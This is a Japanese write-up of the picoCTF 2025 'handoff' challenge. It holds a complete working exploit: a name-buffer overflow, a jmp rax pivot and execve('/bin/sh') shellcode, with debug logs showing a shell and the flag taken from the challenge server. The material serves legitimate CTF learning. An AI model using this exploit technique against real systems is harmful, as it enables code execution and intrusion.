#### handoff（400 points）

1つの C言語のソースコード（handoff.c）と、1つのバイナリプログラム（handoff）をダウンロードできます。また、サーバを起動して進める問題のようです。

<figure class="figure-image figure-image-fotolife" title="handoff（400 points）">[f:id:daisuke20240310:20250316225613p:plain:alt=handoff（400 points）]<figcaption>handoff（400 points）</figcaption></figure>

まずは、ソースコードです。

フラグの処理が見当たりませんが、おそらく、シェルを取ると、フラグのファイルを開くことが出来るんだと思います。

entry構造体は、name[8] と msg[64] をメンバに持ちます。NAME_LEN は、本来は 8 が適切ですが、64 になっています。よって、nameメンバのバッファオーバーフローが可能ですが、32byte までなので、msg の途中までが上書きできる感じだと思います。

メニューで、1 を選ぶと、現在のエントリの name を入力できます。total_entries をインクリメントするので、次のエントリに進む、ということだと思います。また、2 を選ぶと、現在のエントリの msg を入力できます。msg → name の順で入力していくことが想定されてそうです。

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;
			
		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}
```

表層解析を行います。

```sh
$ file handoff
handoff: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=92ca62928eb98ee283995cddad65f7732aad5e0f, for GNU/Linux 3.2.0, not stripped

$ ~/bin/checksec --file=handoff
RELRO          STACK CANARY     NX           PIE     RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Partial RELRO  No canary found  NX disabled  No PIE  No RPATH  No RUNPATH  73 Symbols  No       0          1            handoff

$ pwn checksec --file=handoff
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/handoff/handoff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

シェルを取るための道筋を考えます。最終的に、system関数に、"/bin/sh" を与えることを目標にすると、まず、libc のベースアドレスを求める必要があります。puts関数しかないので、簡単にはアドレスをリークすることは難しそうです。

うーん、少し考えただけでは分からないですね。さすがに最後の問題は難しそうです。とりあえず、GOT あたりから見ていきます。一度実行されると、libc のアドレスが格納されるので、setvbuf関数の GOT も見てみます。libc のアドレスが入ってそうです。

```sh
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/handoff/handoff:
GOT protection: Partial RELRO | Found 7 GOT entries passing the filter
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 ?? endbr64
[0x404020] fgets@GLIBC_2.2.5 -> 0x401040 ?? endbr64
[0x404028] getchar@GLIBC_2.2.5 -> 0x401050 ?? endbr64
[0x404030] fflush@GLIBC_2.2.5 -> 0x401060 ?? endbr64
[0x404038] setvbuf@GLIBC_2.2.5 -> 0x401070 ?? endbr64
[0x404040] __isoc99_scanf@GLIBC_2.7 -> 0x401080 ?? endbr64
[0x404048] exit@GLIBC_2.2.5 -> 0x401090 ?? endbr64

pwndbg> x/gx 0x404038
0x404038 <setvbuf@got.plt>:     0x00007ffff7e40f90
```

vuln関数の逆アセンブラを見てみます。

```sh
pwndbg> disassemble
Dump of assembler code for function vuln:
   0x0000000000401229 <+0>:     endbr64
   0x000000000040122d <+4>:     push   rbp
   0x000000000040122e <+5>:     mov    rbp,rsp
=> 0x0000000000401231 <+8>:     sub    rsp,0x2f0
   0x0000000000401238 <+15>:    mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040123f <+22>:    mov    DWORD PTR [rbp-0x2e4],0xffffffff
   0x0000000000401249 <+32>:    mov    eax,0x0
   0x000000000040124e <+37>:    call   0x4011f6 <print_menu>
   0x0000000000401253 <+42>:    lea    rax,[rbp-0x2e4]
   0x000000000040125a <+49>:    mov    rsi,rax
   0x000000000040125d <+52>:    mov    edi,0x402079
   0x0000000000401262 <+57>:    mov    eax,0x0
   0x0000000000401267 <+62>:    call   0x4010f0 <__isoc99_scanf@plt>
   0x000000000040126c <+67>:    cmp    eax,0x1
   0x000000000040126f <+70>:    je     0x40127b <vuln+82>
   0x0000000000401271 <+72>:    mov    edi,0x0
   0x0000000000401276 <+77>:    call   0x401100 <exit@plt>
   0x000000000040127b <+82>:    call   0x4010c0 <getchar@plt>
   0x0000000000401280 <+87>:    mov    eax,DWORD PTR [rbp-0x2e4]
   0x0000000000401286 <+93>:    cmp    eax,0x1
   0x0000000000401289 <+96>:    jne    0x401301 <vuln+216>
   0x000000000040128b <+98>:    mov    DWORD PTR [rbp-0x2e4],0xffffffff
   0x0000000000401295 <+108>:   cmp    DWORD PTR [rbp-0x4],0x9
   0x0000000000401299 <+112>:   jle    0x4012aa <vuln+129>
   0x000000000040129b <+114>:   mov    edi,0x40207c
   0x00000000004012a0 <+119>:   call   0x4010a0 <puts@plt>
   0x00000000004012a5 <+124>:   jmp    0x401407 <vuln+478>
   0x00000000004012aa <+129>:   mov    edi,0x402098
   0x00000000004012af <+134>:   call   0x4010a0 <puts@plt>
   0x00000000004012b4 <+139>:   mov    rax,QWORD PTR [rip+0x2db5]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x00000000004012bb <+146>:   mov    rdi,rax
   0x00000000004012be <+149>:   call   0x4010d0 <fflush@plt>
   0x00000000004012c3 <+154>:   mov    rcx,QWORD PTR [rip+0x2da6]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x00000000004012ca <+161>:   lea    rsi,[rbp-0x2e0]
   0x00000000004012d1 <+168>:   mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004012d4 <+171>:   movsxd rdx,eax
   0x00000000004012d7 <+174>:   mov    rax,rdx
   0x00000000004012da <+177>:   shl    rax,0x3
   0x00000000004012de <+181>:   add    rax,rdx
   0x00000000004012e1 <+184>:   shl    rax,0x3
   0x00000000004012e5 <+188>:   add    rax,rsi
   0x00000000004012e8 <+191>:   mov    rdx,rcx
   0x00000000004012eb <+194>:   mov    esi,0x20
   0x00000000004012f0 <+199>:   mov    rdi,rax
   0x00000000004012f3 <+202>:   call   0x4010b0 <fgets@plt>
   0x00000000004012f8 <+207>:   add    DWORD PTR [rbp-0x4],0x1
   0x00000000004012fc <+211>:   jmp    0x401249 <vuln+32>
   0x0000000000401301 <+216>:   mov    eax,DWORD PTR [rbp-0x2e4]
   0x0000000000401307 <+222>:   cmp    eax,0x2
   0x000000000040130a <+225>:   jne    0x4013b6 <vuln+397>
   0x0000000000401310 <+231>:   mov    DWORD PTR [rbp-0x2e4],0xffffffff
   0x000000000040131a <+241>:   mov    edi,0x4020c0
   0x000000000040131f <+246>:   call   0x4010a0 <puts@plt>
   0x0000000000401324 <+251>:   lea    rax,[rbp-0x2e4]
   0x000000000040132b <+258>:   mov    rsi,rax
   0x000000000040132e <+261>:   mov    edi,0x402079
   0x0000000000401333 <+266>:   mov    eax,0x0
   0x0000000000401338 <+271>:   call   0x4010f0 <__isoc99_scanf@plt>
   0x000000000040133d <+276>:   cmp    eax,0x1
   0x0000000000401340 <+279>:   je     0x40134c <vuln+291>
   0x0000000000401342 <+281>:   mov    edi,0x0
   0x0000000000401347 <+286>:   call   0x401100 <exit@plt>
   0x000000000040134c <+291>:   call   0x4010c0 <getchar@plt>
   0x0000000000401351 <+296>:   mov    eax,DWORD PTR [rbp-0x2e4]
   0x0000000000401357 <+302>:   cmp    DWORD PTR [rbp-0x4],eax
   0x000000000040135a <+305>:   jg     0x40136b <vuln+322>
   0x000000000040135c <+307>:   mov    edi,0x4020f5
   0x0000000000401361 <+312>:   call   0x4010a0 <puts@plt>
   0x0000000000401366 <+317>:   jmp    0x401407 <vuln+478>
   0x000000000040136b <+322>:   mov    edi,0x402110
   0x0000000000401370 <+327>:   call   0x4010a0 <puts@plt>
   0x0000000000401375 <+332>:   mov    rcx,QWORD PTR [rip+0x2cf4]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x000000000040137c <+339>:   mov    eax,DWORD PTR [rbp-0x2e4]
   0x0000000000401382 <+345>:   lea    rsi,[rbp-0x2e0]
   0x0000000000401389 <+352>:   movsxd rdx,eax
   0x000000000040138c <+355>:   mov    rax,rdx
   0x000000000040138f <+358>:   shl    rax,0x3
   0x0000000000401393 <+362>:   add    rax,rdx
   0x0000000000401396 <+365>:   shl    rax,0x3
   0x000000000040139a <+369>:   add    rax,rsi
   0x000000000040139d <+372>:   add    rax,0x8
   0x00000000004013a1 <+376>:   mov    rdx,rcx
   0x00000000004013a4 <+379>:   mov    esi,0x40
   0x00000000004013a9 <+384>:   mov    rdi,rax
   0x00000000004013ac <+387>:   call   0x4010b0 <fgets@plt>
   0x00000000004013b1 <+392>:   jmp    0x401249 <vuln+32>
   0x00000000004013b6 <+397>:   mov    eax,DWORD PTR [rbp-0x2e4]
   0x00000000004013bc <+403>:   cmp    eax,0x3
   0x00000000004013bf <+406>:   jne    0x4013f3 <vuln+458>
   0x00000000004013c1 <+408>:   mov    DWORD PTR [rbp-0x2e4],0xffffffff
   0x00000000004013cb <+418>:   mov    edi,0x402140
   0x00000000004013d0 <+423>:   call   0x4010a0 <puts@plt>
   0x00000000004013d5 <+428>:   mov    rdx,QWORD PTR [rip+0x2c94]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x00000000004013dc <+435>:   lea    rax,[rbp-0xc]
   0x00000000004013e0 <+439>:   mov    esi,0x20
   0x00000000004013e5 <+444>:   mov    rdi,rax
   0x00000000004013e8 <+447>:   call   0x4010b0 <fgets@plt>
   0x00000000004013ed <+452>:   mov    BYTE PTR [rbp-0x5],0x0
   0x00000000004013f1 <+456>:   jmp    0x40140c <vuln+483>
   0x00000000004013f3 <+458>:   mov    DWORD PTR [rbp-0x2e4],0xffffffff
   0x00000000004013fd <+468>:   mov    edi,0x4021b6
   0x0000000000401402 <+473>:   call   0x4010a0 <puts@plt>
   0x0000000000401407 <+478>:   jmp    0x401249 <vuln+32>
   0x000000000040140c <+483>:   nop
   0x000000000040140d <+484>:   leave
   0x000000000040140e <+485>:   ret
End of assembler dump.
```

スタックを可視化します。

| アドレス | サイズ | 内容 |
| - | - | - |
| rbp - 0x2f0 | 12 | 未使用（rsp） |
| rbp - 0x2e4 | 4 | choice |
| rbp - 0x2e0 | 720 | entries[10] |
| rbp - 0x10 | 4 | 未使用 |
| rbp - 0x0c | 8 | feedback[8] |
| rbp - 0x04 | 4 | total_entries |
| rbp | 8 | 呼び出し元のrbp |

スタックカナリアなどが無いので、リターンアドレスを書き換えることが出来そうです。ROPガジェットを使って、puts関数を呼び出し、setvbuf関数の GOT のアドレスをリークしたいところです。ROPガジェットの末尾に、vuln関数にジャンプするようにしておけば、何度も ROP が実行できそうです。

リターンアドレスに近いアドレスの feedback を書き込む処理である choice に 3 を入力した場合を考えます。feedback配列に、最大 32byte書き込めます。リターンアドレスまでと考えると、8+4+8+8=28byte で、ROPガジェットを作るには足りませんね。

少し考えましたが、アドレスを出力する手段が見当たりません。うーん、ギブアップです。最後の問題だけ、とても難易度が高いですね。

では、writeup を探してみます。日本語の writeup は見つかりませんでしたが、いくつかの海外のサイトで解説がありました。以下が丁寧に解説されていたので、参考にさせて頂きました。

[https://hackmd.io/@sal/HJtUdR5n1e#handoff:embed:cite]

ポイントは、NX が disabled であるため、スタック上のコードを実行できることです。`3` を選択し、`fgets(feedback, NAME_LEN, stdin);` を実行したとき、RAX には、fgets関数の戻り値として、feedback のアドレスが入ります。リターンアドレスを書き換えて、`jmp rax` のコードにジャンプすると、feedback に格納したシェルコードを実行することが出来るとのことでした。NX disable を見逃してしまったのがダメでした。

rp++ で、`jmp rax` を探して見ます。2か所見つかりました。

```sh
$ rp-lin -f handoff -r 10 | grep 'jmp rax'
0x40116c: jmp rax ; (1 found)
0x4011ae: jmp rax ; (1 found)
0x401167: mov edi, 0x00404060 ; jmp rax ; (1 found)
0x4011a9: mov edi, 0x00404060 ; jmp rax ; (1 found)
0x401166: or  [rdi+0x00404060], edi ; jmp rax ; (1 found)
```

次に、feedback に、どんなシェルコードを置けばいいか、ということが説明されています。feedback、total_entries、Saved RBP の計20byte では、大きなシェルコードは置けません。そこで、シェルを起動するためのシェルコードは、entries[0] の msg（64byte）に置いておき、feedback には、そこにジャンプするコードを置くとのことです。ジャンプするコードとは、RSP とのオフセットを調べておき、`sub rsp, 0xXX` を実行して、`jmp rsp` を実行します。オフセットは、スタックの可視化より、ret 実行後の rsp のアドレス（rbp + 8）から、entries[0].msg（rbp - 0x2e0 + 8）を引くので、0x2e0 になります。どんなシェルコードになるかを確認します。

ちなみに、参考にさせて頂いたサイトでは、以下のようなアセンブラを書かれていました。

```asm
nop
sub rsp, 0x2e8
jmp rsp
```

なるほど、`sub rsp, 0x2e8` が 7byte なので、`nop` を入れたんですね。なぜ必要なのかは、分かりませんけど。最初のシェルコードは 10byte のようです。

```sh
$ python

>>> from pwn import *
>>> context(os = 'linux', arch = 'amd64')

>>> asm("sub rsp, 0x2e0")
b'H\x81\xec\xe0\x02\x00\x00'
>>> len(asm("sub rsp, 0x2e0"))
7

>>> asm("jmp rsp")
b'\xff\xe4'
>>> len(asm("jmp rsp"))
2

>>> asm("nop")
b'\x90'
>>> len(asm("nop"))
1

>>> asm("nop; sub rsp, 0x2e0; jmp rsp")
b'\x90H\x81\xec\xe0\x02\x00\x00\xff\xe4'
>>> len(asm("nop; sub rsp, 0x2e0; jmp rsp"))
10
```

次に、シェルを取るためのシェルコードの方を見ていきます。pwntools には、シェルを取るためのシェルコードを簡単に取得できます。中身は理解できてませんが使っていきます。

```sh
$ python

>>> from pwn import *
>>> context(os = 'linux', arch = 'amd64')

>>> shellcraft.sh()
"    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n
    /* push b'/bin///sh\\x00' */\n
    push 0x68\n
    mov rax, 0x732f2f2f6e69622f\n
    push rax\n
    mov rdi, rsp\n
    /* push argument array ['sh\\x00'] */\n
    /* push b'sh\\x00' */\n
    push 0x1010101 ^ 0x6873\n
    xor dword ptr [rsp], 0x1010101\n
    xor esi, esi /* 0 */\n
    push rsi /* null terminate */\n
    push 8\n
    pop rsi\n
    add rsi, rsp\n
    push rsi /* 'sh\\x00' */\n
    mov rsi, rsp\n
    xor edx, edx /* 0 */\n
    /* call execve() */\n
    push SYS_execve /* 0x3b */\n
    pop rax\n
    syscall\n"
```

これでパーツは揃ったので、エクスプロイトコードを実装していきます。

```python
#!/usr/bin/env python3
from pwn import *
import time

bin_file = './handoff'
context(os = 'linux', arch = 'amd64')
context(terminal = ['tmux', 'splitw', '-h'])
context.log_level = 'debug'

binf = ELF( bin_file )

def attack( proc, **kwargs ):
    
    shellcode  = asm(shellcraft.sh())
    somenop    = asm("nop") * (63 - len(shellcode))
    helpercode = asm("nop; sub rsp, 0x2e8; jmp rsp") + b'a' * 10 + p64(0x40116c)
    
    proc.sendlineafter( '3. Exit the app', b'1' )
    proc.sendlineafter( 'name: ', b'name' )
    
    proc.sendlineafter( '3. Exit the app', b'2' )
    proc.sendlineafter( 'send a message to?', b'0' )
    proc.sendlineafter( 'send them?', somenop + shellcode )
    
    proc.sendlineafter( '3. Exit the app', b'3' )
    proc.sendlineafter( 'really appreciate it: ', helpercode )
    
    #info( proc.recvall() )

def main():
    
    adrs = "shape-facility.picoctf.net"
    port = 53574
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    proc.interactive()

if __name__ == '__main__':
    main()
```

実行してみます。

```sh
$ python exploit_handoff.py
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/handoff/handoff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './handoff' argv=[b'./handoff'] : pid 1295831
[DEBUG] cpp -C -nostdinc -undef -P -I/home/user/20240819/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push 59 /* 0x3b */
        pop rax
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-jft5mcrr/step2 /tmp/pwn-asm-jft5mcrr/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-jft5mcrr/step3 /tmp/pwn-asm-jft5mcrr/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/home/user/20240819/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    nop
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-yemzxj50/step2 /tmp/pwn-asm-yemzxj50/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-yemzxj50/step3 /tmp/pwn-asm-yemzxj50/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/home/user/20240819/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    nop; sub rsp, 0x2e8; jmp rsp
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-7hw857pq/step2 /tmp/pwn-asm-7hw857pq/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-7hw857pq/step3 /tmp/pwn-asm-7hw857pq/step4
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x6a bytes:
    b'What option would you like to do?\n'
    b'1. Add a new recipient\n'
    b'2. Send a message to a recipient\n'
    b'3. Exit the app\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x22 bytes:
    b"What's the new recipient's name: \n"
[DEBUG] Sent 0x5 bytes:
    b'name\n'
[DEBUG] Received 0x6a bytes:
    b'What option would you like to do?\n'
    b'1. Add a new recipient\n'
    b'2. Send a message to a recipient\n'
    b'3. Exit the app\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x35 bytes:
    b'Which recipient would you like to send a message to?\n'
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x2a bytes:
    b'What message would you like to send them?\n'
[DEBUG] Sent 0x40 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 6a  x????x????x????x???jx
    00000010  68 48 b8 2f  62 69 6e 2f  2f 2f 73 50  48 89 e7 68  xhH?/xbin/x//sPxH??hx
    00000020  72 69 01 01  81 34 24 01  01 01 01 31  f6 56 6a 08  xri??x?4$?x???1x?Vj?x
    00000030  5e 48 01 e6  56 48 89 e6  31 d2 6a 3b  58 0f 05 0a  x^H??xVH??x1?j;xX???x
    00000040
[DEBUG] Received 0x6a bytes:
    b'What option would you like to do?\n'
    b'1. Add a new recipient\n'
    b'2. Send a message to a recipient\n'
    b'3. Exit the app\n'
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x76 bytes:
    b'Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: \n'
[DEBUG] Sent 0x1d bytes:
    00000000  90 48 81 ec  e8 02 00 00  ff e4 61 61  61 61 61 61  x?H??x????x??aaxaaaax
    00000010  61 61 61 61  6c 11 40 00  00 00 00 00  0a           xaaaaxl?@?x????x?x
    0000001d
[*] Switching to interactive mode

$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2d bytes:
    b'core  exploit_handoff.py  handoff  handoff.c\n'
core  exploit_handoff.py  handoff  handoff.c
$
[*] Stopped process './handoff' (pid 1295831)
```

サーバでも実行します。

```sh
$ python exploit_handoff.py
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/handoff/handoff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to shape-facility.picoctf.net on port 53574: Done
[DEBUG] cpp -C -nostdinc -undef -P -I/home/user/20240819/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push 59 /* 0x3b */
        pop rax
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-dzc57t5r/step2 /tmp/pwn-asm-dzc57t5r/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-dzc57t5r/step3 /tmp/pwn-asm-dzc57t5r/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/home/user/20240819/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    nop
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-27mpzmjt/step2 /tmp/pwn-asm-27mpzmjt/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-27mpzmjt/step3 /tmp/pwn-asm-27mpzmjt/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/home/user/20240819/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    nop; sub rsp, 0x2e8; jmp rsp
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-g36h_tcz/step2 /tmp/pwn-asm-g36h_tcz/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-g36h_tcz/step3 /tmp/pwn-asm-g36h_tcz/step4
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x6a bytes:
    b'What option would you like to do?\n'
    b'1. Add a new recipient\n'
    b'2. Send a message to a recipient\n'
    b'3. Exit the app\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x22 bytes:
    b"What's the new recipient's name: \n"
[DEBUG] Sent 0x5 bytes:
    b'name\n'
[DEBUG] Received 0x6a bytes:
    b'What option would you like to do?\n'
    b'1. Add a new recipient\n'
    b'2. Send a message to a recipient\n'
    b'3. Exit the app\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x35 bytes:
    b'Which recipient would you like to send a message to?\n'
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x2a bytes:
    b'What message would you like to send them?\n'
[DEBUG] Sent 0x40 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 6a  x????x????x????x???jx
    00000010  68 48 b8 2f  62 69 6e 2f  2f 2f 73 50  48 89 e7 68  xhH?/xbin/x//sPxH??hx
    00000020  72 69 01 01  81 34 24 01  01 01 01 31  f6 56 6a 08  xri??x?4$?x???1x?Vj?x
    00000030  5e 48 01 e6  56 48 89 e6  31 d2 6a 3b  58 0f 05 0a  x^H??xVH??x1?j;xX???x
    00000040
[DEBUG] Received 0x6a bytes:
    b'What option would you like to do?\n'
    b'1. Add a new recipient\n'
    b'2. Send a message to a recipient\n'
    b'3. Exit the app\n'
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x76 bytes:
    b'Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: \n'
[DEBUG] Sent 0x1d bytes:
    00000000  90 48 81 ec  e8 02 00 00  ff e4 61 61  61 61 61 61  x?H??x????x??aaxaaaax
    00000010  61 61 61 61  6c 11 40 00  00 00 00 00  0a           xaaaaxl?@?x????x?x
    0000001d
[*] Switching to interactive mode

$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x1a bytes:
    b'flag.txt\n'
    b'handoff\n'
    b'start.sh\n'
flag.txt
handoff
start.sh
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x1d bytes:
    b'picoCTF{p1v0ted_ftw_17db5315}'
picoCTF{p1v0ted_ftw_17db5315}$
[*] Closed connection to shape-facility.picoctf.net port 53574
```
